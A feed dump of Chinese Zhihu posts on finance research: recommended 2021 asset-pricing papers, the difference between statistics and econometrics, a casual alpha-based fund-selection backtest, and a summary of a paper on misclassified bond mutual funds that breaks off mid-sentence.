[{"title":"2021 年，哪些金融学论文让你印象深刻？","date":"2022-02-20 04:10:18","description":"\n<p data-pid=\"SVBbhSlC\">如果只选一篇的话，我会选 <b>Haddad, Huebner and Loualiche (2021)</b>: How Competitive is the Stock Market? Theory, Evidence from Portfolios, and Implications for the Rise of Passive Investing. 这篇 working paper. 个人猜测这篇文章可能是经济学 top 5，而不仅仅是金融学 top. </p>\n<p data-pid=\"MBZqVYIK\">这篇 wp 进一步<b>扩展了 Koijen and Yogo (2019, JPE) 构建的 asset demand system</b>. 除了每个投资者特有的、asset characteristic-based demand, 投资者还会对其他投资者的需求变化做出响应：当其他投资者交易更加激进（保守）时，投资者会交易地更加保守（激进）。</p>\n<p data-pid=\"rBwaWCls\">巧妙之处在于，利用这样一个看似朴素的设定，作者们<b>可以据此估计市场竞争的激烈程度，而这不仅仅是金融学，也是整个经济学最为关心的基本问题</b>。通过假定所有投资者对于其他投资者交易行为的变化有着同样的响应系数，可以定量地估计出该系数，并据此衡量市场竞争程度。当金融市场完全竞争时，该响应系数应等于 1，从而完全抵消掉任一投资者的异质性投资行为变化。但如果不是完全竞争，则该系数会小于 1，从而投资者的个体行为会对资产价格产生实质性影响。</p>\n<p data-pid=\"mt4s_6BQ\">参考公众号的介绍：</p>\n<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/pigaLdTlrLq8Fn3xgmZbXQ\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic3.zhimg.com/v2-19bd1047fe217ab501ed895fca202c2c_bh.jpg\" data-image-width=\"1080\" data-image-height=\"459\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">【083】股票市场是高度竞争的吗？</a><p data-pid=\"ReOTuvab\">BTW, 这种用简洁的框架回答基础的、重要的问题的思路，是我个人非常喜欢的研究。而 Haddad 的不少工作都有类似的特征。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/llanglli?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">llanglli</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/461125440/answer/2246662659?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">5 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/385263069?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">经济学本科论文用到的数据在哪些网站找呀？</a><br><a href=\"http://www.zhihu.com/question/438298986?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何看待JFE(Journal of Financial Economics)离职编辑爆料稿件杀手?</a><br>\n","link":"http://www.zhihu.com/question/461125440/answer/2246662659?utm_campaign=rss&utm_medium=rss&utm_source=rss&utm_content=title"},{"title":"2021 年，哪些金融学论文让你印象深刻？","date":"2022-02-20 04:10:09","description":"\n<p data-pid=\"zLMGm8Fk\">本回答仅限于 2021 年见刊或即将发表的（所以相应的 working paper 会更早一些）。我其实考虑过再至少补一篇今年的 working paper。但是因为我要介绍的这篇令我的印象太过深刻，因此我想把本回答的全部篇幅都留给它。这篇文章就是：</p>\n<p data-pid=\"W5kRPyZu\">Martin, I. and S. Nagel (2021). Market efficiency in the age of big data. <b><i>Journal of Financial Economics</i></b> forthcoming.</p>\n<p data-pid=\"PQxO5WOc\">一直以来，人们纠结于因子或异象在样本外失效的各种原因：伪发现，市场结构变化，交易拥挤，曝光导致被套利走等等。Martin and Nagel (2021) 提出了一个全新的视角：<b>investor high-dimensional learning</b>。</p>\n<p data-pid=\"FqJX7Wtu\">传统实证资产定价假设理性预期（rational expectation），即假设投资者知道哪些变量影响公司基本面以及它们和基本面的关系，即假设 <img src=\"https://www.zhihu.com/equation?tex=%E5%9F%BA%E6%9C%AC%E9%9D%A2%3Df%28%E9%A2%84%E6%B5%8B%E5%8F%98%E9%87%8F%29\" alt=\"基本面=f(预测变量)\" eeimg=\"1\"> 对投资者是已知的，并在这个前提下通过历史数据（在样本内）检验市场有效性。一旦原假设被拒绝便认为变量获得的超额收益代表着风险补偿或定价错误。</p>\n<p data-pid=\"lZmqlj0g\">然而，Martin and Nagel (2021) 指出，在大数据时代，投资者根本无法知道到底哪些变量能够影响公司基本面，以及变量和基本面之间的关系 <img src=\"https://www.zhihu.com/equation?tex=f%28%29\" alt=\"f()\" eeimg=\"1\"> 到底是什么样。取而代之的是在高维参数空间的学习问题，即估计 <img src=\"https://www.zhihu.com/equation?tex=f%28%29\" alt=\"f()\" eeimg=\"1\"> 到底长什么样、参数是多少。</p>\n<p data-pid=\"n0TIbJbX\">这个研究视角在我看来非常合理。对于在实时进行投资决策的我们来说，预测基本面或者资产的预期收益毫无疑问是高维预测问题（没有任何经济理论支持我们可以从先验认为该问题满足稀疏性假设 —— 不过这是 another story，择日再表）。因此，<b>当我们在研究历史数据中的收益率和公司特征或其他协变量之间的关系时，凭什么能够假设在历史时刻进行交易的投资者没有面临和我们一样的困境 —— 高维预测问题 —— 呢？</b></p>\n<p data-pid=\"YcIU_wAU\">我们不能。</p>\n<p data-pid=\"_2Hk_cyB\">在理性预期范式下，不存在投资者对 <img src=\"https://www.zhihu.com/equation?tex=f%28%29\" alt=\"f()\" eeimg=\"1\"> 的学习问题，因此样本内检验发现的可预测性可以直接推广到样本外。然而，一旦投资者需要估计 <img src=\"https://www.zhihu.com/equation?tex=f%28%29\" alt=\"f()\" eeimg=\"1\"> 且估计存在误差时，通过样本内检验发现的可预测性则无法再保证样本外的可预测性。</p>\n<p data-pid=\"bh84tR0N\"><b>从直观上来理解，这是因为投资者高维学习问题会导致均衡状态下资产的价格和理性预期情况下相比出现偏差；该偏差的存在将造成事后（ex post）从计量经济学家的视角来看，已实现收益率不再随机，而是包含了一部分可预测的成分；因此当人们事后用统计检验分析变量和收益率的关系时，会误以为某些变量对收益率有预测性（且在高维问题下，即变量越来越多时，这个偏差造成的影响愈加明显）。</b></p>\n<p data-pid=\"-Ay2zSlP\">但实际的情况是，对投资者来说，这种可预测性在事前（ex ante）是感知不到的；对进行事后检验的计量经济学家来说，样本内的可预测性仅仅是源自由投资者学习 <img src=\"https://www.zhihu.com/equation?tex=f%28%29\" alt=\"f()\" eeimg=\"1\"> 而导致的资产定价的偏差，因而是虚假的，这些变量在样本外并不能预测收益率。</p>\n<p data-pid=\"sJCev6wI\">因此，该文主张 investor high-dimensional learning 的存在使得我们通过事后分析得到的很多显著性只不过是样本内的伪发现而已。下图高度总结了该文。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-ed61e7401b77a0a5a1d04b34c8da4f0c_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"709\" data-watermark=\"watermark\" data-original-src=\"v2-ed61e7401b77a0a5a1d04b34c8da4f0c\" data-watermark-src=\"v2-9b36e3377e1ed685a398297ee2dc45f1\" data-private-watermark-src=\"v2-9fa764b7f6e7f5b9d112ca7e1cd316d2\"></p>\n<p data-pid=\"D1p7jYlC\">就我个人的看法，Martin and Nagel (2021) 的发现对学术界的意义重大。在实证资产定价研究中，学术界通常假设理性预期（即投资者不存在学习问题），因而无一例外都是事后通过样本内的数据来检验某个异象或者因子的超额收益是否显著大于零。这一惯例在过去 30 年内产生了大量样本内显著的异象，但是其中的绝大多数在样本外压根不好使或者无法被复现。而究其原因，除了 p-hacking 以及被套利走之外，Martin and Nagel (2021) 给出了另一个解释。</p>\n<p data-pid=\"eT3dCB8t\">在大数据时代，我们有了过去无可比拟的数据量。然而，投资者面临更加复杂的高维预测和估计问题。<b>大数据如何影响投资者的估计，如何影响均衡状态下资产的价格，如何影响市场的有效性？</b>这些都是等待回答的问题。毫无疑问，Martin and Nagel (2021) 是一个有益和大胆的尝试，而它提出的 investor high-dimensional learning 问题也足以引起人们的重视。</p>\n<p data-pid=\"ShM3FmHv\"><b>所有历史数据都是样本内。我们既是样本外的投资者，又是样本内的统计者，必须承认 investor high-dimensional learning 带来的伪发现，以及搞清楚它如何影响均衡状态下资产的价格。</b></p>\n<p data-pid=\"rGnnCSEr\">我个人真的非常期待在这个研究方向上的任何前沿进展。</p>\n<p data-pid=\"px26Bk3o\">哦，如果非要说这篇文章有什么美中不足的话，那就是在我看来，一篇 JF 级别的论文被发到了 JFE。</p>\n<p data-pid=\"yG-0qrq2\">关于该文的详细解读请参考：</p>\n<a href=\"https://zhuanlan.zhihu.com/p/382885396\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic2.zhimg.com/v2-8b0efe13d16d7a2850d694d4b9ca32ca_bh.jpg\" data-image-width=\"2282\" data-image-height=\"1221\" class=\"internal\">石川：False In-Sample Predictability?</a><p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/mitcshi?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">石川</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/461125440/answer/2253292198?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">5 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/385263069?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">经济学本科论文用到的数据在哪些网站找呀？</a><br><a href=\"http://www.zhihu.com/question/438298986?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何看待JFE(Journal of Financial Economics)离职编辑爆料稿件杀手?</a><br>\n","link":"http://www.zhihu.com/question/461125440/answer/2253292198?utm_campaign=rss&utm_medium=rss&utm_source=rss&utm_content=title"},{"title":"统计学和计量经济学有什么区别？","date":"2022-02-20 04:03:49","description":"\n<p data-pid=\"mQ_c348M\">我是计量经济学理论方向的在读博士生，做过本科计量经济学和博士计量经济学的助教，看到这个经典的问题，也来贡献一下看法。</p>\n<p data-pid=\"_pfrOwYI\">计量经济学和统计学的区别根源之一，在于关心的重点不同。统计学关心的是相关性（correlation），而计量经济学关心的是因果性（causality）。为什么它们关心的重点不同？因为两个学科所服务的研究主题和研究方式不同。</p>\n<p data-pid=\"2JYQmpGX\">具体而言，统计学通常服务于可实验性更高的学科，例如生物学，医学等。而计量经济学服务于实验性不那么高的学科，例如经济学，金融学，社会学等。实验性高是指什么呢？举个例子，我们想要研究一种药物对改变某个基因表达的影响，我们可以设计一个控制变量实验来研究。“控制变量”就是实验的一个重要特征。如果实验组和对照组相比，改变的变量只有一个，那么二组在结果变量上的区别可以直接归因于这个单一的因变量。实验性高有什么好处呢？大家都知道，回归系数本身只是一个相关关系的大小，而实验性高的好处就在于，通过控制变量，收集实验数据，进行回归分析（regression），我们可以把估计出的回归参数（estimated coefficient ）直接看成因果关系的大小，因此统计学在这里不需要刻意区分相关性与因果性。然而，在社会经济类学科中，我们就很难保证实验性了。试想，我们要研究一项经济政策对人们收入的影响，难道我们能把全国人民随机分组，然后一组实行政策，另一组不实行吗？这是几乎不可能做到的。那么这个研究要如何进行下去呢？我们只能试图依赖已经观测到的经济数据来分析。相比完美的实验数据，观测到的数据不再具备“控制变量”这么好的性质（也就是有“内生性”），那怎么办呢？我们只能退而求其次，对简单的回归模型施加更多假设。这就进入了计量经济学的范畴：如何施加不过分（合理）的假设，以得到一个“差不多像做实验一样”的识别条件，从而保证我们依然能够将回归结果中的“相关关系”诠释为“因果关系”。在这个过程中，我们施加的假设，有些是可以用数据做“证据”来说明其合理性的，有些则没有数据说话，而只能依赖经济学逻辑分析。具体情况不同，我们挑选的假设也可以不同，所以计量经济学家开发了适用于不同场景的丰富模型。这些计量模型，与传统的统计学中出现的模型相比，已经走出了一条深远的，不一样的道路。</p>\n<p data-pid=\"i4iWWHRS\">总结一下：为了服务不同特点的研究内容与研究目的，统计学和计量经济学的区别由此展开。具体的区别包括：模型假设的不同、数据形式和数据假设不同（例如，很多统计学模型更强调数据正态分布的假设，而经济学数据大多是不符合这个假设的）、假设检验的理论依据不同（例如，统计学模型有一部分是有限样本检验，而经济数据通常是大样本，检验时用的是大样本近似理论）等等等等。还有很多因这些基本的不同而衍生出的许许多多区别，这就形成了两门看上去非常相似实际上却各自自成一脉的学科。</p>\n<p data-pid=\"CpRdONOL\">当然，学好两门学科中的任意一门都有助于加深对另一门的理解和运用，前提是我们可以清晰地辨别二者的异同，并理解各种缘由。希望我的答案能对各位对这个问题的理解产生一点积极贡献。</p>\n<p><br></p>\n<p data-pid=\"kL_dJsFj\">btw，对于有限样本（finite sample）和大样本（large sample）理论的区别，以及计量经济学和统计学在运用这两个理论时的区别，还可以多讨论几句。在传统的统计学的OLS中，我们会注意到一个经常出现的假设：error term follows a Gaussian distribution，即误差项是正态分布的。与其他假设相结合，我们能得到的结论是，在对OLS模型的估计量进行单个假设检验的时候，检验统计量（testing statistics）服从一个 t 分布。这个 t 分布的自由度n等于样本量的大小n，是一个精确的分布。意思是说，对于不同数据集的不同样本大小，这个 t 分布对应的自由度也相应变化。当样本量趋向于无限大时，t分布趋向于标准正态分布。而在统计学的假设检验中，我们已知具体的样本大小n，能计算精确的统计量分布，而t值，p值，查表值，置信区间（confidence interval）等，都是基于精确的 t(n)分布的。</p>\n<p data-pid=\"_LIBZvLQ\">那么，在计量经济学中会有什么不同呢？首先，我们丢掉正态分布的假设，因为在绝大多数情况下，它不符合经济数据的特征。没了这个假设，还能推出针对有限样本n的统计量分布吗？不能了。那还可以继续做假设检验吗？可以。如何做？我们运用基于大样本理论的假设检验。为什么可以用大样本理论？因为在经济学研究中，数据集一般是很大的，少也有几百，大可以到几万甚至更多，在这样大的样本下，我们可以想象，样本量最终有机会趋向于无穷大。有了脑子里的这个想象，我们可以用统计量近似服从（在n无穷大时）的分布来做假设检验。根据大样本理论，我们知道，标准化后的检验统计量近似服从一个标准正态分布。这就是为什么在计量经济学中，0.05水平假设检验的 t 值，永远是和1.96比较的。因为1.96是标准正态分布的97.5%分位数，我们用它，其实是在用大样本近似。希望这几句补充可以给统计学和计量经济学的区别添加一个佐证。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/xiao-ji-23-23?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">小吉</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/24622808/answer/2342953361?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">67 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/30464664?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">计量经济学或者统计学证明了哪些「似乎不可能」存在的联系？</a><br><a href=\"http://www.zhihu.com/question/52347172?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">计量经济学所谈论的「因果」是什么意思？</a><br>\n","link":"http://www.zhihu.com/question/24622808/answer/2342953361?utm_campaign=rss&utm_medium=rss&utm_source=rss&utm_content=title"},{"title":"聊聊学术投资：学术研究可否变现？","date":"2022-02-20 03:53:37","description":"\n<p data-pid=\"HGWoV59J\">最近刚完成一篇论文的写作，论文主要研究了影响国内主动管理市场的绩效表现的一些因素，修改论文的间隙突发奇想写下了这个题目：靠学术投资能在国内证券市场上赚到钱吗？（避雷：以下内容涉及到一些学术名词，不喜勿进）</p>\n<p data-pid=\"h9Wx2gww\">     其实在美国这样的发达市场，学术研究早已和业界实践相结合。其中做的比较好的应该是AQR capital，这家基金属于最学术的基金公司了。创始人Cliff Asness本身就是芝加哥Eugune Fama教授的得意弟子，博士毕业进入业界后一手创立了AQR capital，靠着Smart beta的投资理念和低管理费把资产规模（AUM）越做越大，不过最近几年已经从对冲慢慢转向共同基金。他们官网的主页上还经常会提供一些高质量的科研论文及数据，Ciff本人非常坚守动量原则和价值投资的理念，在2020AQR发布的白皮书中，Cliff强调：坚守动量并不意味贬低价值，真正的价值投资也并非不经选择的买入持有，兼顾动量因子和价值因子，并将两个因子结合起来使用时，将会带来超越市场的收益率。</p>\n<p data-pid=\"ZSNhdgJH\">    15年Fama French的五因子模型中曾强调价值因子(HML)已经逐渐变成了一个冗余因子，因为加入盈利(RMW)和投资(CMA)因子后HML对超额收益(Alpha)的解释能力已经非常低，意味着HML因子带来的收益已经完全可以被五因子模型中的其他因子所覆盖。 而为了解答出现这个现象的原因，Eugene Fama和Kenneth French今年一月又在SSRN上发表了一篇最新的学术论文，题目是The value premium，旨在研究价值因子上的溢价是不是在Fama &amp; French (1992)发表出来后的28年间因为逐渐增多的交易而减少甚至是消失。结论也证实了他们的猜想：1963July-1991June期间的价值溢价要显著高于1991July-2019June的期间的价值溢价，说明92年那篇文章发表后确实使更多的交易集中在价值因子上，在市场上造成了巨大的影响。</p>\n<p data-pid=\"grVHeNq0\">    前面的这些比较枯燥冗长的讲述都是想说明，学术投资在美国市场早已有了一段时间的发展历史，且被证实可以用于在证券市场上进行变现。但是要投资美股除了买QDII基金，好像在国内的广大投资者也没有什么比较方便的渠道。那么，在国内证券市场上是否可以实现产学结合，依靠学术投资来变现呢？</p>\n<p data-pid=\"csxHJN7-\">    其实前几年的话，国内的产学结合情况相比国外还是存在比较严重的撕裂。大多数商学院都是左手Paper，右手年化-20%的收益率。但是这种情况最近几年在慢慢变好，去年我在开会的时候曾认识了央财的一个老师，她就是通过自己的研究去买股票，实现年化80%的收益率的，她这篇去年发在金融研究上的文章其实与Asness那篇有名的Quality minus junk比较像，也是从四个维度构建质量指标，研究A股市场在构建的质量指标上是否有溢价，从而佐证了价值投资策略在中国 A 股市场的可行性和有效性。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-5dc407cca28c19a194c79558381efc09_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1632\" data-rawheight=\"1240\" class=\"origin_image zh-lightbox-thumb\" width=\"1632\" data-original=\"https://pic2.zhimg.com/v2-5dc407cca28c19a194c79558381efc09_r.jpg\"></figure><p data-pid=\"EzgkJn7f\">    将这篇文章作为一个学术投资的正面范例，接下来用我自己的研究来聊聊学术投资这件事。</p>\n<p data-pid=\"T6iVSN2Z\">    因为我自己的研究主要是基金，所以不涉及选股，下面带大家看看学术投资在选基金上能带来多大的收益。我现在这个研究最开始的数据是去年六月份下载的，当时的数据包括从2005-2019年4月我国开放式基金市场上所有的公募基金，为了研究需要我删除了所有QDII基金，QFII基金，货币基金和债券基金，为了指标计算需要进一步删除了交易数据低于24个月的基金数据。</p>\n<p data-pid=\"RoJKrsVv\">    当然在这里不可能把没发表的文章内容贴出来的，因为文章内容也不是这篇科普性文章的目的。这里主要讲学术选基，我当时使用了四个模型来做基金绩效的评估，CAPM模型，Fama French三因子(FF3)模型，Fama French Carhart四因子(FFC4)模型，以及Fama French五因子(FF5)模型。</p>\n<p data-pid=\"o-XDWj-9\">    使用滚动窗口回归，通过将之前六个月基金的交易数据在不同的绩效模型中回归后得到每个模型下的超额收益alpha，而这些alpha就是基金绩效评估的主要指标。前两天我突发奇想，如果用我算出来的alpha去从大到小排个序买基金并持有一年，结果会是怎样的呢？</p>\n<p data-pid=\"LkaEU0qW\">    我选定2019年4月份，将计算出的FFC4 alpha（因为这是基金最常使用的绩效评价模型）从高到低进行排序，然后一个一个去check了这些基金的收益率。先贴出我分析文件的截图：</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-d3aa292bef15b555ebc9925a3b08184b_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1449\" data-rawheight=\"785\" class=\"origin_image zh-lightbox-thumb\" width=\"1449\" data-original=\"https://pic4.zhimg.com/v2-d3aa292bef15b555ebc9925a3b08184b_r.jpg\"></figure><p data-pid=\"6D1D03MP\">    然后我从上到下一个一个检查了这些基金中排名前五的基金（如果从我去年6月刚算完指标的时候开始投资到现在的收益率），结果如下图：</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-f56159fdb2a2bf28eb9c4716512b5bf6_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"6684\" class=\"origin_image zh-lightbox-thumb\" width=\"1000\" data-original=\"https://pic3.zhimg.com/v2-f56159fdb2a2bf28eb9c4716512b5bf6_r.jpg\"></figure><p data-pid=\"aLUX7yxZ\">    可以看到，如果我从去年六月开始投资计算出FFC4 alpha排名为前五的基金的话，那么这一年可以实现约36.33%-64.01%的收益率。这个数值并不小。这里用来计算alpha的方法和模型也都是最基础的，只要接触过金融的人都知道的方法和模型，而且这种方法不需要花时间去阅读基金的“基金招募说明书”，只需要根据模型结果进行相应投资即可。</p>\n<p data-pid=\"pnONJMBk\">   总结一下吧，本文分析了国内外学术投资的发展，给出了一些学术投资的范例，并用国内开放式公募基金数据从实证分析的角度证实了学术投资的实操性。</p>\n<p data-pid=\"NQ4B57jB\">    不敢相信自己竟然能把脑海中的突发奇想写下来并凑成这样的长篇大论，最后想跟所有的金融民工说：只要好好搬砖，年化35%+不是梦（此处手动狗头）</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p data-pid=\"10QVaUb9\">参考文献：</p>\n<p data-pid=\"BjmxtjCy\">尹力博，廖毅辉. 中国A股市场存在品质溢价吗？金融研究，2019(10): 170-187.</p>\n<p data-pid=\"M8W5OBw0\">Carhart, M. M., 1997. On persistence in mutual fund performance. The Journal of Finance 52(1), 57- 82.</p>\n<p data-pid=\"pSW8ZWum\">Fama, E. F. and French, K. R., 1993. Common risk factors in the returns on stocks and bonds. Journal of Financial Economics 33(1), 3-56.</p>\n<p data-pid=\"grVJW9P9\">Fama, E.F. and French, K.R., 2015, A five-factor asset pricing model. Journal of Financial Economics 16(1), 1-22.</p>\n<p data-pid=\"VZdkyukh\">Jensen, M.C., 1968. The performance of mutual funds in the period 1945–1964. The Journal of Finance 23(2), 389-416.</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/NanCy_love?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">小艾同学丿L</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br>\n","link":"http://zhuanlan.zhihu.com/p/146196220?utm_campaign=rss&utm_medium=rss&utm_source=rss&utm_content=title"},{"title":"【002基金研究】被“错误分类”的债券基金","date":"2022-02-20 03:45:52","description":"\n<p data-pid=\"eacY-Mi3\">   这是金融学前沿论文精读专栏的第二期。本期我们精读的论文是于2021年8月发表在The Journal of Finance上的“不要相信他们的话：被错误分类的债券型共同基金”(Don’t Take Their Word for It: The Misclassification of Bond Mutual Funds，CCG(2021))。本文为债券基金经理对其持有的资产进行错误分类提供了直接证据，并发现与基金报告的资产配置相比，有高达31.4%的基金被错误分类至更安全的资产配置类别。<b>本文通过实证研究发现，这些实际持有高风险债券的基金平均表现优于相同风格箱中那些真正的低风险债券基金，而且可以获得更高的晨星评级和更多的投资者现金流，但是根据基金的实际风险对这些基金重新进行正确分类时，会发现这些基金表现不如同风险类别里的其他基金。</b></p>\n<p data-pid=\"Ok4jxz4O\">   与股票型基金不同，债券型基金哪怕持有相同公司发行的债券，也会因为债券的收益，久期和条款(如赎回条件)等不同而有所差异。因此，虽然SEC要求对股票型和债券型共同基金的投资组合成分进行同等程度披露，数据在处理和汇总到固定收益基金层面的衡量标准方面常常更为复杂，此时，就需要晨星(MorningStar)这样的信息中介机构提供一定程度对固定收益基金的一般风险、久期的等汇总和总结。<b>而CCG(2021)的主要工作就是通过将晨星向投资者提供的基金概况与基金的实际投资组合进行了比较，比较后发现几乎所有债券基金的基金风险类别都存在着明显的被“错误分类”。此外，这种错误分类在被晨星报告为“非常安全类别(Overly Safe)”的基金中普遍存在。</b>因为晨星所使用的信用风险摘要不是从基金公司向美国证监会(SEC)提交的基金持有情况文件中报告的详细持有信息中得到的，而是基于基金公司自我报告的数据(Self-reported Summary Report)， 但基金平均报告的投资组合比其实际持有的投资组合要安全得多。</p>\n<p data-pid=\"pqzw7Nxs\"><b> CCG(2021)将“错误分类的基金”定义为依据基金公司自我报告的数据被分类到的与其实际资产配置不同的风格箱的那些基金。</b>研究发现这种错误分类主要是单向的，即低估了风险，将基金从风险类别更高的归类至风险类别更安全的类型中。</p>\n<p data-pid=\"Hgi0INJn\"><b>  CCG(2021)的研究主要分为以下几个部分：</b></p>\n<p data-pid=\"C_YtPVue\"><b>1. 根据对“错误分类”的定义研究基金被错误分类的程度</b></p>\n<p data-pid=\"nVBCnMsl\"><b>2. 造成基金被错误分类的主要因素</b></p>\n<p data-pid=\"eeVkfSeJ\"><b>3. 这种错误分类将怎样影响投资者的行为</b> </p>\n<p data-pid=\"rrp3cDlO\">   本文中所使用的数据主要来源于：</p>\n<p data-pid=\"8McwEryR\">1. 晨星直属共同基金及其特征数据库(the Morningstar Direct database of mutual funds and their characteristics)</p>\n<p data-pid=\"KZ8WmeRv\">2. 晨星开放式共同基金持仓数据库(the Morningstar Open-Ended Mutual Fund Hold- ings database)</p>\n<p data-pid=\"3ZvCBmDM\">3. 信用评级历史记录</p>\n<p data-pid=\"Y8JotYKc\">   关于信用评级历史记录，本文收集了美国比较大的几家信用评级机构：Standard &amp; Poor’s, Moody’s, Fitch提供的评级数据。当多个信用评级机构对一项资产进行评级时，本文使用晨星自己的方法文件规定的Bloomberg/Barclays方法来进行汇总。根据这种方法，如果一种证券仅由一个机构评级，则将该评级用作综合评级。 如果证券由两个机构评级，则使用更保守的评级。 如果所有三个评级机构都存在，则使用中位数评级。另外有政府背书的证券，统一被归类为AAA级。理想情况下，如果晨星及其数据库中的债券基金在信用评级方面保持相同的报告标准，则基金报告的持股百分比将与计算出的持股百分比几乎相同。<b>但本文发现，基金普遍会在自我报告中将自己持有的资产归为安全系数更高的一类：对于高于投资级别(即高于BBB级)的资产，基金自我报告中的资产百分比明显高于晨星计算的资产百分比；而当对那些低于投资级别的资产(尤其是未评级资产)，查看同样的缺口时，就会出现相反的模式，即基金上报的资产占比明显低于晨星计算的资产占比</b>。对比TableI中的Panel B和Panel C可明显看出这点。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-33a27729ef66bd96530c0ad6785d0a14_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1476\" data-rawheight=\"1692\" class=\"origin_image zh-lightbox-thumb\" width=\"1476\" data-original=\"https://pic1.zhimg.com/v2-33a27729ef66bd96530c0ad6785d0a14_r.jpg\"></figure><h2>被错误分类对基金绩效的影响：</h2>\n<p data-pid=\"rDZJNRml\"><b> CCG(2021)首先构建了一个用于衡量被错误分类的虚拟变量：Misclassified，如果晨星给定的信用评级高于其实际的信用评级（实际风险更高），Misclassified就取值1，如果晨星给定的信用评级低于其实际的信用评级或与其实际的信用评级大小相当（实际风险与评估一致或更低），Misclassified就取值0。</b>然后CCG(2021)用了两种指标来衡量债券基金的绩效，第一个是bond fund yields，这里一共使用了三个不同计算方式下的年息(yield)，一个是reported yield，这个数据是基金自愿汇报给晨星的；一个是晨星自己根据基金持仓计算出的yield，这个数据是2017年之后才有；以及过去一年的总yield+coupon+dividend。从TableIII的结果中可以明显看出，被错误分类的基金具有更高的到期收益率(列(1)-(3))，但是将它们与那些和其真实风险水平相当的基金进行比较时，它们的收益率与这些真正意义上的同行相差无几(列(4)-(6))。用来衡量债券基金绩效的第二个指标是基金的actual monthly return。TableIV得到了相同的结论，甚至发现当这些被“错误分类”的基金与它们真实的风险等级一样的基金中做对比时，它们会表现的不如其他同行基金。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-bfa71d591ee4c06f3acd9faa1662def8_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2208\" data-rawheight=\"1090\" class=\"origin_image zh-lightbox-thumb\" width=\"2208\" data-original=\"https://pic1.zhimg.com/v2-bfa71d591ee4c06f3acd9faa1662def8_r.jpg\"></figure><figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-7642720a8d12ab432b07d374ce195c7a_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1442\" data-rawheight=\"1098\" class=\"origin_image zh-lightbox-thumb\" width=\"1442\" data-original=\"https://pic3.zhimg.com/v2-7642720a8d12ab432b07d374ce195c7a_r.jpg\"></figure><h2>被错误分类基金的晨星评级，费率，和资金流入</h2>\n<p data-pid=\"Rq4thGVe\"><b>CCG(2021)发现被错误分类的基金因为在同风险类别基金中的更优表现可以得到更高的晨星评级。</b>之前的大量文献都发现晨星评级与资金的资金流有着非常密切的关系(Del Guercio and Tkac 